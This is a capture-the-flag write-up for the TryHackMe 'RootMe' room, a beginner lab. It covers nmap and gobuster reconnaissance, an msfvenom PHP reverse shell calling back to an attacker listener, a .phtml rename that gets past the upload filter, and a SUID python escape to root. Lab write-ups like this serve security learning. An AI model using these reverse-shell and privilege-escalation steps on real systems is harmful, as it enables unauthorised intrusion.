---
title: "RootMe"
date: 2022-12-20T11:34:45-08:00
draft: false
type: WriteUps
tags: ['tryhackme', 'CTF', 'Writeup']
---
# RootMe

{{< figure src="/rootme/rootme.png" width=240px height=240px attr="A ctf for beginners, can you root me?" >}}

___

Here's a [Link](https://tryhackme.com/room/rrootme) to the room.

First, I'm going to add the ip address of the machine to my /etc/hosts folder for ease of access.

``` bash
echo target-ip rootme >> /etc/hosts
```

Next, it's time for some reconnaissance.

___

### Reconnaissance

``` bash
nmap -sC -sV -T4 -oN nmap.txt rootme
```

``` bash
Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-20 21:29 GMT
Nmap scan report for rootme (10.10.24.110)
Host is up (0.050s latency).
Not shown: 932 closed ports, 66 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
MAC Address: 02:C3:1F:E4:6F:A7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

Thanks to the scan I can see that there are 2 ports open, *22* and *80*.

I've also found that the version of Apache running on the server is *2.4.29*.

And that the service running on port 22 is *ssh*.

``` bash
gobuster dir -u http://rootme -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
``` bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://rootme
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/12/20 21:41:14 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
===============================================================
2022/12/20 21:41:38 Finished
===============================================================
```

Using Gobuster as the next question suggests I find one hidden directory that I can access, */panel/*.

___

### Getting a Shell

After visiting the /panel/ directory I find an upload form.
Before attempting to upload my payload I'll check out the page's source to see if there's any more info to be gained.

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/panel.css">
    <script src=../"js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="first">
        <div class="main-div">
            <form action="" method="POST" enctype="multipart/form-data">
                <p>Select a file to upload:</p>
                <input type="file" name="fileUpload" class="fileUpload">
                <input type="submit" value="Upload" name="submit">
                
                            </form>
        </div>
    </div>
</body>
</html>
```

Nothing to be gained there.
Next, I'll create a php reverse shell payload using msfvenom.

``` bash
msfvenom -p php/reverse_php LHOST=10.10.77.103 LPORT=9001 -o shell.php
```

And start up a netcat listener on port 9001 

``` bash
nc -lvnp 9001
```

When I attempt to upload the shell however, I get an error message telling me php uploads aren't allowed.

``` bash
PHP não é permitido!
```

The error is very explicit, which leads me to believe that php files are the only ones filtered.
To test this theory, I'll rename the payload to "shell.phtml," and try again.

``` bash
O arquivo foi upado com sucesso!
```

Success!

Now I'll move over to the /uploads/ directory and click on the payload to start the reverse shell.  

Once the reverse shell has connected to my listener, I'll stabilize the shell with this command  

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

And then find the user flag with

``` bash
find / -type f -name user.txt 2> /dev/null
/var/www/user.txt

cat /var/www/user.txt
THM{***************}
```
Success! One flag down, one more to go.

___

### Privilege Escalation

Now that the shell is stabilized and I've found the user flag next up is escalating to root privileges.  

The first question asks about SUID bits, so I'll run a search for files with SUID permissions.

``` bash
find / -type f -perm -04000 2>/dev/null
```

``` bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
...
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

*/usr/bin/python* is the odd file out, and a quick search on GTFObins provides me with an easy vector for privilige escalation:

``` bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```
Now that I have root priviliges, I can search for and print the root flag:

``` bash
find / -type f -name root.txt 2>/dev/null
/root/root.txt

cat /root/root.txt
THM{*******************}
```

___

## Success!

And that'll do it, I've captured both RootMe flags!
